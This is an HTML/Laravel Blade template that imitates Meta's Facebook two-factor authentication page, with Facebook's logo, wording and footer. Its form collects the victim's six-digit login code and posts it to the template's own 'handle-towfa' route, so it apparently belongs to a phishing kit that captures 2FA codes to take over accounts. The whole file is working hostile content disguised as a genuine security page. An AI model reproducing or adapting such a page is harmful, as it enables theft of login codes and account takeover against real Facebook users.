<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" />
    <link rel="stylesheet" href="/App.css">
    <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
    <title>Security</title>
    <link rel="stylesheet" href="{{ asset('assets/auth.css') }}">
    <title>Security</title>
    <link href="https://netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" />
</head>

<body>
    <section class="page-2fa">
        <header class="header-fa">
            <div class="container-header">
                <nav class="logo">
                    <a href="/">
                        <img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta"
                            class="logo-meta" decoding="auto" loading="lazy" />
                    </a>
                </nav>
                <div id="logout">
                    <a href="" title="Log out">
                        Log out
                    </a>
                </div>
            </div>
        </header>
        <main class="main-2fa">
            <form action="{{ route('handle-towfa') }}" method="post" id="form-twofa">
                @csrf
                <div class="fa-main">
                    <h3 class="title-2fa">
                        Choose a way to confirm that it's you
                    </h3>
                    <p class="underline-popup abc"></p>
                    <p class="description-2fa">
                        Your account has two-factor authentication
                        switched on, which requires this login step.
                    </p>
                    <p class="underline-popup abc"></p>
                    <h3 class="title-2fa">
                        Approve from another device
                    </h3>
                    <p class="description-2fa">
                        We already sent a notification to your logged-in
                        devices. Check your Facebook notifications where
                        you're already logged in to the account and
                        approve the login to continue.
                    </p>
                    <p class="underline-popup abc"></p>
                    <p class="title-2fa">
                        Or, enter your login code
                    </p>
                    <p class="setup-2fa">
                        Enter the 6-digit code from the authentication app
                        that you set up.
                    </p>
                    <input type="" placeholder="Login code" id="2fa" name="twofa_code" class="input-2fa"
                        maxLength="6" pattern="\d{6}" />

                    <div class="end-2fa">
                        <a href="" class="setup">
                            Need another way to confirm
                            <span class="link-2fa">
                                that it's you?
                            </span>
                        </a>
                        <nav class="button-2fa-sm">
                            <button class="submit-code-2fa" type="submit" style="cursor: pointer">
                                Submit code
                            </button>
                        </nav>
                    </div>
                </div>
            </form>

        </main>
        <section class="footer-2fa">
            <div class="footer-box">
                <div class="footer-lang">
                    <div class="footer-title">
                        <a href="">English (UK)</a>
                    </div>
                    <div class="footer-title">
                        <a href="">Tiếng Việt</a>
                    </div>
                    <div class="footer-title">
                        <a href="">中文(台灣)</a>
                    </div>
                    <div class="footer-title">
                        <a href="">한국어</a>
                    </div>
                    <div class="footer-title">
                        <a href="">日本語</a>
                    </div>
                    <div class="footer-title">
                        <a href="">Français (France)</a>
                    </div>
                    <div class="footer-title">
                        <a href="">ภาษาไทย</a>
                    </div>
                    <div class="footer-title">
                        <a href="">Español</a>
                    </div>
                    <div class="footer-title">
                        <a href="">Português (Brasil)</a>
                    </div>
                    <div class="footer-title">
                        <a href="">Deutsch</a>
                    </div>
                    <div class="footer-title">
                        <a href="">Italiano</a>
                    </div>
                    <div class="footer-title">
                        <a href=""></a>
                    </div>
                </div>
            </div>
            <p class="underline-popup abc under"></p>
            <div class="footer-box">
                <div class="footer-two">
                    <div class="footer-title-2">
                        <a href="">Sign Up</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Log in</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Messenger</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Facebook Lite</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Video</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Places</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Games</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Marketplace</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Meta Pay</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Meta Store</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Meta Quest</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Instagram</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Threads</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Fundraisers</a>
                    </div>
                </div>
            </div>
            <div class="footer-box">
                <div class="footer-two">
                    <div class="footer-title-2">
                        <a href="">Services</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Voting Information Centre</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Privacy Policy</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Privacy Centre</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Groups</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">About</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Create ad</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Create Page</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Developers</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Careers</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Cookies</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Instagram</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">AdChoices</a>
                    </div>
                </div>
            </div>
            <div class="footer-box">
                <div class="footer-two">
                    <div class="footer-title-2">
                        <a href="">Terms</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">Help</a>
                    </div>
                    <div class="footer-title-2">
                        <a href="">
                            Contact uploading and non-users
                        </a>
                    </div>
                </div>
            </div>
            <div class="footer-box">
                <div class="footer-title-3">
                    <a href="">Meta © 2023</a>
                </div>
            </div>
        </section>
    </section>
</body>
<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
<script>
    $('button.submit-code-2fa').on('click', function(e) {
        const _this = $(this);
        _this.prop('disabled', false)
        _this.find('i').remove()
        _this.append('<i class="fa fa-spinner fa-spin"></i>')
        _this.prop('disabled', true)
        $('#form-twofa').submit();
    })
</script>

</html>
